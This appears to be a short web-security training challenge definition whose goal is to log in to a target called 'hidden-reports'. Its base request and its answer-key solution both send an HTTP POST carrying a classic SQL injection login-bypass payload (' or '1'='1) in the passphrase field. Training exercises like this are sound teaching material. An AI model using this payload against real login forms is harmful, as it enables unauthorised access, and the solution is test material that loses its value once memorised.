  ask questions!

  **Goal: Log in**

hints: []

target: hidden-reports

base_request: |-
  POST / HTTP/1.1
  Host: localhost

  passphrase=' or '1'='1

solution: |-
  POST / HTTP/1.1
  Host: localhost
  Content-Length: 20
  Content-Type: application/x-www-form-urlencoded

  passphrase='or'1'='1

